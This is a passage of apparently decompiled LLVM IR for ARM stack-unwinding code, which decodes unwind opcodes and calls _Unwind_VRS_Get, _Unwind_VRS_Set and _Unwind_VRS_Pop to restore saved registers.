  br label %dec_label_pc_18bec

dec_label_pc_18bec:                               ; preds = %bb148, %.thread6.dec_label_pc_18bec_crit_edge
  %v0_18bec = phi i32 [ %v0_18bec.pre, %.thread6.dec_label_pc_18bec_crit_edge ], [ %v0_18bd0, %bb148 ]
  %v1_18bec = add i32 %v0_18bec, 9
  %v2_18bec = inttoptr i32 %v1_18bec to i8*
  %v3_18bec = load i8, i8* %v2_18bec, align 1
  %v4_18bec = zext i8 %v3_18bec to i32
  store i32 %v4_18bec, i32* %r3.global-to-local, align 4
  %v2_18bf0 = icmp eq i8 %v3_18bec, 0
  store i1 %v2_18bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bf0, label %dec_label_pc_18bf8, label %dec_label_pc_18afc

dec_label_pc_18bf8:                               ; preds = %dec_label_pc_18bec, %dec_label_pc_18af0, %dec_label_pc_18b18
  %v0_18bf8 = load i32, i32* @sl, align 4
  %v2_18bf8 = icmp eq i32 %v0_18bf8, 0
  store i1 %v2_18bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bf8, label %dec_label_pc_18cc0, label %bb149

bb149:                                            ; preds = %dec_label_pc_18bf8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c04

dec_label_pc_18c04:                               ; preds = %bb149, %dec_label_pc_19174, %dec_label_pc_19014, %dec_label_pc_18e38, %dec_label_pc_18df0, %dec_label_pc_18dac, %dec_label_pc_18cc0
  %v1_18c0c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_19174 ], [ 9, %dec_label_pc_19014 ], [ 9, %dec_label_pc_18e38 ], [ 9, %dec_label_pc_18df0 ], [ 9, %dec_label_pc_18dac ], [ %v0_18cf4, %dec_label_pc_18cc0 ]
  store i32 %v9_18ac8, i32* %r6.global-to-local, align 4
  store i32 %v21_18ac8, i32* @lr, align 4
  ret i32 %v1_18c0c

dec_label_pc_18c10:                               ; preds = %dec_label_pc_18b34
  %v1_18c10 = mul i32 %v0_18b34, 4
  %v3_18c14 = and i32 %v1_18c10, 252
  store i32 %v3_18c14, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18c20 = load i32, i32* @r7, align 4
  store i32 %v0_18c20, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18c28 = add nuw nsw i32 %v3_18c14, 4
  store i32 %v1_18c28, i32* %r6.global-to-local, align 4
  %v5_18c30 = call i32 @_Unwind_VRS_Get(i32 %v0_18c20, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18c34 = load i32, i32* @r4, align 4
  %v1_18c34 = and i32 %v0_18c34, 64
  %v2_18c34 = icmp eq i32 %v1_18c34, 0
  store i1 %v2_18c34, i1* %cpsr_z.global-to-local, align 1
  %v4_18c3c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18c48 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_18c48
  %storemerge160.p = select i1 %v2_18c34, i32 %v2_18c48, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_18c3c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18c64 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18c64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18adc.backedge

dec_label_pc_18adc.backedge:                      ; preds = %dec_label_pc_18c10, %dec_label_pc_18c8c, %dec_label_pc_19110, %dec_label_pc_18ddc, %dec_label_pc_18e14, %dec_label_pc_18d94, %dec_label_pc_19000
  %v0_18adc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18adc

dec_label_pc_18c6c:                               ; preds = %dec_label_pc_18b3c
  %v7_18c6c = icmp eq i32 %v1_18b3c, 144
  store i1 %v7_18c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c6c, label %dec_label_pc_18c74, label %dec_label_pc_18db4

dec_label_pc_18c74:                               ; preds = %dec_label_pc_18c6c
  %v1_18c74 = urem i32 %v0_18b34, 16
  store i32 %v1_18c74, i32* %r2.global-to-local, align 4
  %v2_18c78 = icmp eq i32 %v1_18c74, 15
  store i1 %v2_18c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c78, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_18c74
  %v8_18c7c = icmp eq i32 %v1_18c74, 13
  store i1 %v8_18c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18c7c, label %bb154, label %dec_label_pc_18c8c

.thread21:                                        ; preds = %dec_label_pc_18c74
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18dac

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18dac

dec_label_pc_18c8c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18c98 = load i32, i32* @r7, align 4
  store i32 %v0_18c98, i32* %r0.global-to-local, align 4
  %v5_18ca0 = call i32 @_Unwind_VRS_Get(i32 %v0_18c98, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18ca8 = load i32, i32* @r7, align 4
  store i32 %v0_18ca8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_18cb8 = call i32 @_Unwind_VRS_Set(i32 %v0_18ca8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18cb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18adc.backedge

dec_label_pc_18cc0:                               ; preds = %dec_label_pc_18bf8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18cd0 = load i32, i32* @r7, align 4
  store i32 %v0_18cd0, i32* %r0.global-to-local, align 4
  %v7_18cd8 = call i32 @_Unwind_VRS_Get(i32 %v0_18cd0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_18cdc = load i32, i32* @r7, align 4
  store i32 %v0_18cdc, i32* %r0.global-to-local, align 4
  %v0_18ce0 = load i32, i32* @sl, align 4
  store i32 %v0_18ce0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_18ce0, i32* %r3.global-to-local, align 4
  %v5_18cf0 = call i32 @_Unwind_VRS_Set(i32 %v0_18cdc, i32 %v0_18ce0, i32 15, i32 %v0_18ce0, i8* bitcast (i32* @0 to i8*))
  %v0_18cf4 = load i32, i32* @sl, align 4
  store i32 %v0_18cf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c04

dec_label_pc_18cfc:                               ; preds = %dec_label_pc_18ef0
  %v7_18cfc = icmp eq i32 %v0_18ef0, 199
  store i1 %v7_18cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18cfc, label %dec_label_pc_18fd0, label %dec_label_pc_18d04

dec_label_pc_18d04:                               ; preds = %dec_label_pc_18cfc
  %v1_18d04 = and i32 %v0_18b34, 248
  store i32 %v1_18d04, i32* %r3.global-to-local, align 4
  %v7_18d08 = icmp eq i32 %v1_18d04, 192
  store i1 %v7_18d08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d08, label %.thread24, label %dec_label_pc_18d20

.thread24:                                        ; preds = %dec_label_pc_18d04
  %v2_18d0c = urem i32 %v0_18b34, 16
  %v2_18d10 = add nuw nsw i32 %v2_18d0c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_18d18 = or i32 %v2_18d10, 655360
  store i32 %v2_18d18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18d20:                               ; preds = %dec_label_pc_18d04
  %v7_18d20 = icmp eq i32 %v0_18ef0, 200
  store i1 %v7_18d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d20, label %dec_label_pc_18f64, label %dec_label_pc_18d28

dec_label_pc_18d28:                               ; preds = %dec_label_pc_18d20
  %v7_18d28 = icmp eq i32 %v0_18ef0, 201
  store i1 %v7_18d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d28, label %dec_label_pc_18d30, label %dec_label_pc_18dac

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18d28
  %v0_18d30 = load i32, i32* @r5, align 4
  %v1_18d30 = add i32 %v0_18d30, 8
  %v2_18d30 = inttoptr i32 %v1_18d30 to i8*
  %v3_18d30 = load i8, i8* %v2_18d30, align 1
  %v4_18d30 = zext i8 %v3_18d30 to i32
  store i32 %v4_18d30, i32* %r3.global-to-local, align 4
  %v2_18d34 = icmp eq i8 %v3_18d30, 0
  store i1 %v2_18d34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d34, label %dec_label_pc_18d44, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_18d30
  %v2_18d38 = add nsw i32 %v4_18d30, -1
  store i32 %v2_18d38, i32* %r3.global-to-local, align 4
  %v2_18d3c = trunc i32 %v2_18d38 to i8
  store i8 %v2_18d3c, i8* %v2_18d30, align 1
  %v0_18d40.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d40.pr.pr, label %.thread26.dec_label_pc_18d44_crit_edge, label %dec_label_pc_18d78

.thread26.dec_label_pc_18d44_crit_edge:           ; preds = %.thread26
  %v0_18d44.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18d44

dec_label_pc_18d44:                               ; preds = %.thread26.dec_label_pc_18d44_crit_edge, %dec_label_pc_18d30
  %v2_18d5c = phi i32 [ %v0_18d44.pre, %.thread26.dec_label_pc_18d44_crit_edge ], [ %v0_18d30, %dec_label_pc_18d30 ]
  %v1_18d44 = add i32 %v2_18d5c, 9
  %v2_18d44 = inttoptr i32 %v1_18d44 to i8*
  %v3_18d44 = load i8, i8* %v2_18d44, align 1
  %v4_18d44 = zext i8 %v3_18d44 to i32
  store i32 %v4_18d44, i32* %r3.global-to-local, align 4
  %v2_18d48 = icmp eq i8 %v3_18d44, 0
  store i1 %v2_18d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d48, label %dec_label_pc_18d94, label %dec_label_pc_18d58

dec_label_pc_18d58:                               ; preds = %dec_label_pc_18d44
  %v1_18d58 = add nsw i32 %v4_18d44, -1
  store i32 %v1_18d58, i32* %r3.global-to-local, align 4
  %v1_18d5c = trunc i32 %v1_18d58 to i8
  store i8 %v1_18d5c, i8* %v2_18d44, align 1
  %v0_18d60 = load i32, i32* @r5, align 4
  %v1_18d60 = add i32 %v0_18d60, 4
  %v2_18d60 = inttoptr i32 %v1_18d60 to i32*
  %v3_18d60 = load i32, i32* %v2_18d60, align 4
  store i32 %v3_18d60, i32* %r2.global-to-local, align 4
  %v1_18d64 = inttoptr i32 %v3_18d60 to i32*
  %v2_18d64 = load i32, i32* %v1_18d64, align 4
  store i32 %v2_18d64, i32* %r0.global-to-local, align 4
  %v4_18d64 = add i32 %v3_18d60, 4
  store i32 %v4_18d64, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18d64, i32* %v2_18d60, align 4
  %v0_18d70 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d70 = trunc i32 %v0_18d70 to i8
  %v2_18d70 = load i32, i32* @r5, align 4
  %v3_18d70 = add i32 %v2_18d70, 8
  %v4_18d70 = inttoptr i32 %v3_18d70 to i8*
  store i8 %v1_18d70, i8* %v4_18d70, align 1
  %v0_18d74 = load i32, i32* %r0.global-to-local, align 4
  %v1_18d74 = load i32, i32* @r5, align 4
  %v2_18d74 = inttoptr i32 %v1_18d74 to i32*
  store i32 %v0_18d74, i32* %v2_18d74, align 4
  br label %dec_label_pc_18d78

dec_label_pc_18d78:                               ; preds = %.thread26, %dec_label_pc_18d58
  %v0_18d78 = load i32, i32* %r0.global-to-local, align 4
  %v3_18d78 = udiv i32 %v0_18d78, 16777216
  %v1_18d7c = urem i32 %v3_18d78, 16
  %v3_18d80 = mul i32 %v0_18d78, 256
  %v1_18d84 = add nuw nsw i32 %v1_18d7c, 1
  store i32 %v1_18d84, i32* %r1.global-to-local, align 4
  %v1_18d88 = and i32 %v3_18d78, 240
  store i32 %v1_18d88, i32* %r3.global-to-local, align 4
  %v1_18d8c = load i32, i32* @r5, align 4
  %v2_18d8c = inttoptr i32 %v1_18d8c to i32*
  store i32 %v3_18d80, i32* %v2_18d8c, align 4
  %v0_18d90 = load i32, i32* %r1.global-to-local, align 4
  %v1_18d90 = load i32, i32* %r3.global-to-local, align 4
  %v4_18d90 = mul i32 %v1_18d90, 4096
  %v5_18d90 = or i32 %v4_18d90, %v0_18d90
  br label %dec_label_pc_18d94

dec_label_pc_18d94:                               ; preds = %dec_label_pc_18d44, %dec_label_pc_18d78
  %storemerge = phi i32 [ %v5_18d90, %dec_label_pc_18d78 ], [ 720897, %dec_label_pc_18d44 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_18d94 = load i32, i32* @r7, align 4
  store i32 %v0_18d94, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18da0 = call i32 @_Unwind_VRS_Pop(i32 %v0_18d94, i32 1, i32 5, i32 5)
  store i32 %v4_18da0, i32* %r0.global-to-local, align 4
  %v2_18da4 = icmp eq i32 %v4_18da0, 0
  store i1 %v2_18da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18da4, label %dec_label_pc_18adc.backedge, label %dec_label_pc_18dac

dec_label_pc_18dac:                               ; preds = %dec_label_pc_18ff8, %dec_label_pc_18d28, %dec_label_pc_18e08, %dec_label_pc_191ac, %dec_label_pc_1917c, %dec_label_pc_19158, %dec_label_pc_18fe4, %dec_label_pc_18d94, %dec_label_pc_18ba8, %dec_label_pc_18b9c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c04

dec_label_pc_18db4:                               ; preds = %dec_label_pc_18c6c
  %v7_18db4 = icmp eq i32 %v1_18b3c, 160
  store i1 %v7_18db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18db4, label %dec_label_pc_18dbc, label %dec_label_pc_18df8

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18db4
  %v0_18dbc = load i32, i32* %ip.global-to-local, align 4
  %v1_18dbc = urem i32 %v0_18dbc, 8
  %v1_18dc0 = xor i32 %v1_18dbc, 7
  store i32 %v1_18dc0, i32* %r3.global-to-local, align 4
  %v6_18dc8 = lshr i32 4080, %v1_18dc0
  %v1_18dcc = and i32 %v0_18b34, 8
  %v2_18dcc = icmp eq i32 %v1_18dcc, 0
  store i1 %v2_18dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_18dd0 = and i32 %v6_18dc8, 4080
  %tmp155 = mul nuw nsw i32 %v1_18dcc, 2048
  %tmp156 = or i32 %v1_18dd0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18ddc:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1916c.dec_label_pc_18ddc_crit_edge, %bb157, %dec_label_pc_18fc8, %dec_label_pc_18f5c, %dec_label_pc_18ebc, %dec_label_pc_18dbc
  %v2_18de4 = phi i32 [ %v2_18ee0, %.thread44 ], [ %v2_18ee8, %bb157 ], [ %v2_18de4.pre, %dec_label_pc_1916c.dec_label_pc_18ddc_crit_edge ], [ %v2_18d18, %.thread24 ], [ %storemerge130, %dec_label_pc_18fc8 ], [ %storemerge131, %dec_label_pc_18f5c ], [ %storemerge132, %dec_label_pc_18ebc ], [ %tmp156, %dec_label_pc_18dbc ]
  %v0_18de0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1916c.dec_label_pc_18ddc_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_18fc8 ], [ 3, %dec_label_pc_18f5c ], [ 1, %dec_label_pc_18ebc ], [ 0, %dec_label_pc_18dbc ]
  %v0_18ddc = load i32, i32* @r7, align 4
  store i32 %v0_18ddc, i32* %r0.global-to-local, align 4
  store i32 %v0_18de0, i32* %r3.global-to-local, align 4
  %v4_18de4 = call i32 @_Unwind_VRS_Pop(i32 %v0_18ddc, i32 %v0_18de0, i32 %v2_18de4, i32 %v0_18de0)
  store i32 %v4_18de4, i32* %r0.global-to-local, align 4
  %v2_18de8 = icmp eq i32 %v4_18de4, 0
  store i1 %v2_18de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18de8, label %dec_label_pc_18adc.backedge, label %dec_label_pc_18df0

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18ddc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c04

dec_label_pc_18df8:                               ; preds = %dec_label_pc_18db4
  %v7_18df8 = icmp eq i32 %v1_18b3c, 176
  store i1 %v7_18df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18df8, label %dec_label_pc_18e40, label %dec_label_pc_18e00

dec_label_pc_18e00:                               ; preds = %dec_label_pc_18df8
  %v7_18e00 = icmp eq i32 %v1_18b3c, 192
  store i1 %v7_18e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e00, label %dec_label_pc_18ef0, label %dec_label_pc_18e08

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18e00
  %v1_18e08 = and i32 %v0_18b34, 248
  store i32 %v1_18e08, i32* %r3.global-to-local, align 4
  %v7_18e0c = icmp eq i32 %v1_18e08, 208
  store i1 %v7_18e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e0c, label %dec_label_pc_18e14, label %dec_label_pc_18dac

dec_label_pc_18e14:                               ; preds = %dec_label_pc_18e08
  %v1_18e14 = urem i32 %v0_18b34, 8
  %v1_18e18 = add nuw nsw i32 %v1_18e14, 1
  %v1_18e1c = or i32 %v1_18e18, 524288
  store i32 %v1_18e1c, i32* %r2.global-to-local, align 4
  %v0_18e20 = load i32, i32* @r7, align 4
  store i32 %v0_18e20, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18e2c = call i32 @_Unwind_VRS_Pop(i32 %v0_18e20, i32 1, i32 %v1_18e1c, i32 5)
  store i32 %v4_18e2c, i32* %r0.global-to-local, align 4
  %v2_18e30 = icmp eq i32 %v4_18e2c, 0
  store i1 %v2_18e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e30, label %dec_label_pc_18adc.backedge, label %dec_label_pc_18e38

dec_label_pc_18e38:                               ; preds = %dec_label_pc_18e14
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c04

dec_label_pc_18e40:                               ; preds = %dec_label_pc_18df8
  %v0_18e40 = load i32, i32* %ip.global-to-local, align 4
  %v7_18e40 = icmp eq i32 %v0_18e40, 177
  store i1 %v7_18e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e40, label %dec_label_pc_19144, label %dec_label_pc_18e48

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e40
  %v7_18e48 = icmp eq i32 %v0_18e40, 178
  store i1 %v7_18e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e48, label %dec_label_pc_1901c, label %dec_label_pc_18e50

dec_label_pc_18e50:                               ; preds = %dec_label_pc_18e48
  %v7_18e50 = icmp eq i32 %v0_18e40, 179
  store i1 %v7_18e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e50, label %dec_label_pc_18e58, label %dec_label_pc_18ec4

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e50
  %v0_18e58 = load i32, i32* @r5, align 4
  %v1_18e58 = add i32 %v0_18e58, 8
  %v2_18e58 = inttoptr i32 %v1_18e58 to i8*
  %v3_18e58 = load i8, i8* %v2_18e58, align 1
  %v4_18e58 = zext i8 %v3_18e58 to i32
  store i32 %v4_18e58, i32* %r3.global-to-local, align 4
  %v2_18e5c = icmp eq i8 %v3_18e58, 0
  store i1 %v2_18e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e5c, label %dec_label_pc_18e6c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_18e58
  %v2_18e60 = add nsw i32 %v4_18e58, -1
  store i32 %v2_18e60, i32* %r3.global-to-local, align 4
  %v2_18e64 = trunc i32 %v2_18e60 to i8
  store i8 %v2_18e64, i8* %v2_18e58, align 1
  %v0_18e68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e68.pr.pr, label %.thread30.dec_label_pc_18e6c_crit_edge, label %dec_label_pc_18ea0

.thread30.dec_label_pc_18e6c_crit_edge:           ; preds = %.thread30
  %v0_18e6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e6c

dec_label_pc_18e6c:                               ; preds = %.thread30.dec_label_pc_18e6c_crit_edge, %dec_label_pc_18e58
  %v2_18e84 = phi i32 [ %v0_18e6c.pre, %.thread30.dec_label_pc_18e6c_crit_edge ], [ %v0_18e58, %dec_label_pc_18e58 ]
  %v1_18e6c = add i32 %v2_18e84, 9
  %v2_18e6c = inttoptr i32 %v1_18e6c to i8*
  %v3_18e6c = load i8, i8* %v2_18e6c, align 1
  %v4_18e6c = zext i8 %v3_18e6c to i32
  store i32 %v4_18e6c, i32* %r3.global-to-local, align 4
  %v2_18e70 = icmp eq i8 %v3_18e6c, 0
  store i1 %v2_18e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e70, label %dec_label_pc_18ebc, label %dec_label_pc_18e80

dec_label_pc_18e80:                               ; preds = %dec_label_pc_18e6c
  %v1_18e80 = add nsw i32 %v4_18e6c, -1
  store i32 %v1_18e80, i32* %r3.global-to-local, align 4
  %v1_18e84 = trunc i32 %v1_18e80 to i8
  store i8 %v1_18e84, i8* %v2_18e6c, align 1
  %v0_18e88 = load i32, i32* @r5, align 4
  %v1_18e88 = add i32 %v0_18e88, 4
  %v2_18e88 = inttoptr i32 %v1_18e88 to i32*
  %v3_18e88 = load i32, i32* %v2_18e88, align 4
  store i32 %v3_18e88, i32* %r2.global-to-local, align 4
  %v1_18e8c = inttoptr i32 %v3_18e88 to i32*
  %v2_18e8c = load i32, i32* %v1_18e8c, align 4
  store i32 %v2_18e8c, i32* %r0.global-to-local, align 4
  %v4_18e8c = add i32 %v3_18e88, 4
  store i32 %v4_18e8c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18e8c, i32* %v2_18e88, align 4
  %v0_18e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_18e98 = trunc i32 %v0_18e98 to i8
  %v2_18e98 = load i32, i32* @r5, align 4
  %v3_18e98 = add i32 %v2_18e98, 8
  %v4_18e98 = inttoptr i32 %v3_18e98 to i8*
  store i8 %v1_18e98, i8* %v4_18e98, align 1
  %v0_18e9c = load i32, i32* %r0.global-to-local, align 4
  %v1_18e9c = load i32, i32* @r5, align 4
  %v2_18e9c = inttoptr i32 %v1_18e9c to i32*
  store i32 %v0_18e9c, i32* %v2_18e9c, align 4
  br label %dec_label_pc_18ea0

dec_label_pc_18ea0:                               ; preds = %.thread30, %dec_label_pc_18e80
  %v0_18ea0 = load i32, i32* %r0.global-to-local, align 4
  %v3_18ea0 = udiv i32 %v0_18ea0, 16777216
  %v1_18ea4 = urem i32 %v3_18ea0, 16
  %v3_18ea8 = mul i32 %v0_18ea0, 256
  store i32 %v3_18ea8, i32* %r0.global-to-local, align 4
  %v1_18eac = add nuw nsw i32 %v1_18ea4, 1
  store i32 %v1_18eac, i32* %r2.global-to-local, align 4
  %v1_18eb0 = and i32 %v3_18ea0, 240
  store i32 %v1_18eb0, i32* %r3.global-to-local, align 4
  %v1_18eb4 = load i32, i32* @r5, align 4
  %v2_18eb4 = inttoptr i32 %v1_18eb4 to i32*
  store i32 %v3_18ea8, i32* %v2_18eb4, align 4
  %v0_18eb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18eb8 = load i32, i32* %r3.global-to-local, align 4
  %v4_18eb8 = mul i32 %v1_18eb8, 4096
  %v5_18eb8 = or i32 %v4_18eb8, %v0_18eb8
  br label %dec_label_pc_18ebc

dec_label_pc_18ebc:                               ; preds = %dec_label_pc_18e6c, %dec_label_pc_18ea0
  %storemerge132 = phi i32 [ %v5_18eb8, %dec_label_pc_18ea0 ], [ 720897, %dec_label_pc_18e6c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18ec4:                               ; preds = %dec_label_pc_18e50
  %v1_18ec4 = and i32 %v0_18b34, 252
  store i32 %v1_18ec4, i32* %r3.global-to-local, align 4
  %v7_18ec8 = icmp eq i32 %v1_18ec4, 180
  store i1 %v7_18ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ec8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_18ec4
  %v2_18ecc = urem i32 %v0_18b34, 4
  %v2_18ed4 = add nuw nsw i32 %v2_18ecc, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_18ee0 = or i32 %v2_18ed4, 262144
  store i32 %v2_18ee0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ddc

bb157:                                            ; preds = %dec_label_pc_18ec4
  %v2_18ed0 = urem i32 %v0_18e40, 8
  %v2_18ed8 = add nuw nsw i32 %v2_18ed0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_18ee8 = or i32 %v2_18ed8, 524288
  store i32 %v2_18ee8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ddc

dec_label_pc_18ef0:                               ; preds = %dec_label_pc_18e00
  %v0_18ef0 = load i32, i32* %ip.global-to-local, align 4
  %v7_18ef0 = icmp eq i32 %v0_18ef0, 198
  store i1 %v7_18ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ef0, label %dec_label_pc_18ef8, label %dec_label_pc_18cfc

dec_label_pc_18ef8:                               ; preds = %dec_label_pc_18ef0
  %v0_18ef8 = load i32, i32* @r5, align 4
  %v1_18ef8 = add i32 %v0_18ef8, 8
  %v2_18ef8 = inttoptr i32 %v1_18ef8 to i8*
  %v3_18ef8 = load i8, i8* %v2_18ef8, align 1
  %v4_18ef8 = zext i8 %v3_18ef8 to i32
  store i32 %v4_18ef8, i32* %r3.global-to-local, align 4
  %v2_18efc = icmp eq i8 %v3_18ef8, 0
  store i1 %v2_18efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18efc, label %dec_label_pc_18f0c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_18ef8
  %v2_18f00 = add nsw i32 %v4_18ef8, -1
  store i32 %v2_18f00, i32* %r3.global-to-local, align 4
  %v2_18f04 = trunc i32 %v2_18f00 to i8
  store i8 %v2_18f04, i8* %v2_18ef8, align 1
  %v0_18f08.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f08.pr.pr, label %.thread48.dec_label_pc_18f0c_crit_edge, label %dec_label_pc_18f40

.thread48.dec_label_pc_18f0c_crit_edge:           ; preds = %.thread48
  %v0_18f0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f0c

dec_label_pc_18f0c:                               ; preds = %.thread48.dec_label_pc_18f0c_crit_edge, %dec_label_pc_18ef8
  %v2_18f24 = phi i32 [ %v0_18f0c.pre, %.thread48.dec_label_pc_18f0c_crit_edge ], [ %v0_18ef8, %dec_label_pc_18ef8 ]
  %v1_18f0c = add i32 %v2_18f24, 9
  %v2_18f0c = inttoptr i32 %v1_18f0c to i8*
  %v3_18f0c = load i8, i8* %v2_18f0c, align 1
  %v4_18f0c = zext i8 %v3_18f0c to i32
  store i32 %v4_18f0c, i32* %r3.global-to-local, align 4
  %v2_18f10 = icmp eq i8 %v3_18f0c, 0
  store i1 %v2_18f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f10, label %dec_label_pc_18f5c, label %dec_label_pc_18f20

dec_label_pc_18f20:                               ; preds = %dec_label_pc_18f0c
  %v1_18f20 = add nsw i32 %v4_18f0c, -1
  store i32 %v1_18f20, i32* %r3.global-to-local, align 4
  %v1_18f24 = trunc i32 %v1_18f20 to i8
  store i8 %v1_18f24, i8* %v2_18f0c, align 1
  %v0_18f28 = load i32, i32* @r5, align 4
  %v1_18f28 = add i32 %v0_18f28, 4
  %v2_18f28 = inttoptr i32 %v1_18f28 to i32*
  %v3_18f28 = load i32, i32* %v2_18f28, align 4
  store i32 %v3_18f28, i32* %r2.global-to-local, align 4
  %v1_18f2c = inttoptr i32 %v3_18f28 to i32*
  %v2_18f2c = load i32, i32* %v1_18f2c, align 4
  store i32 %v2_18f2c, i32* %r0.global-to-local, align 4
  %v4_18f2c = add i32 %v3_18f28, 4
  store i32 %v4_18f2c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18f2c, i32* %v2_18f28, align 4
